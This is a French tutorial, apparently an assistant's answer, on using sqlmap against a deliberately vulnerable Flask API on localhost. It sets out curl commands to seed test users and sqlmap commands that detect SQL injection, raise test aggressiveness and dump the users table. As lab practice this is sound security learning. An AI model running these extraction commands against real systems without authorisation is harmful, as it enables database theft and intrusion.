Utilisation de sqlmap pour tester l'API web vulnérable que nous avons créée.

### Étape 1 : Lancer l'application Flask

Assure-toi que l'application Flask est en cours d'exécution. Si ce n'est pas déjà fait, exécute le script `app.py` :

```bash
python app.py
```

L'application doit maintenant être accessible à l'adresse `http://127.0.0.1:5000`.

### Étape 2 : Ajouter des utilisateurs

Avant de tester avec sqlmap, nous devons ajouter quelques utilisateurs à la base de données pour avoir des données à interroger.

Des outils comme `curl` ou simplement un navigateur pour envoyer des requêtes POST à l'endpoint `/add_user`. Voici comment ajouter un utilisateur avec `curl` :

```bash
curl -X POST -d "username=admin&password=admin123" http://127.0.0.1:5000/add_user
curl -X POST -d "username=test&password=test123" http://127.0.0.1:5000/add_user
```

### Étape 3 : Utiliser sqlmap

Maintenant que nous avons des données dans notre base de données, nous pouvons utiliser sqlmap pour tester la vulnérabilité. sqlmap est un outil puissant qui peut détecter et exploiter les injections SQL.

#### Commande de base

Pour tester notre endpoint vulnérable avec sqlmap, nous pouvons utiliser la commande suivante :

```bash
sqlmap -u "http://127.0.0.1:5000/vulnerable?username=test"
```

#### Explication de la commande

- `-u` spécifie l'URL de la requête vulnérable.
- `http://127.0.0.1:5000/vulnerable?username=test` est l'URL que nous testons, où `username=test` est le paramètre potentiellement vulnérable.

#### Options supplémentaires

sqlmap a de nombreuses options pour affiner et contrôler les tests. Voici quelques options courantes :

- **Détection de base** :
  ```bash
  sqlmap -u "http://127.0.0.1:5000/vulnerable?username=test" --batch
  ```
  Utilise le mode batch pour éviter les confirmations interactives.

- **Dump de la base de données** :
  ```bash
  sqlmap -u "http://127.0.0.1:5000/vulnerable?username=test" --dump
  ```
  Cette commande va essayer d'extraire les données de la base de données.

- **Détection et exploitation automatiques** :
  ```bash
  sqlmap -u "http://127.0.0.1:5000/vulnerable?username=test" --risk=3 --level=5
  ```
  `--risk=3` et `--level=5` augmentent la profondeur et l'agressivité des tests.

### Exemple d'utilisation

1. **Tester la vulnérabilité** :
   ```bash
   sqlmap -u "http://127.0.0.1:5000/vulnerable?username=test" --batch
   ```
   Sqlmap analysera l'URL et essayera de détecter une injection SQL.

2. **Extraire les données** :
   ```bash
   sqlmap -u "http://127.0.0.1:5000/vulnerable?username=test" --dump
   ```
   Si une vulnérabilité est trouvée, sqlmap extraira les données de la base de données.

### Résultat attendu

Si la requête est vulnérable, sqlmap devrait détecter la vulnérabilité et être capable d'extraire les données de la base de données. Tu verras des messages de détection de vulnérabilité, suivis de l'extraction des informations contenues dans la table `users`.
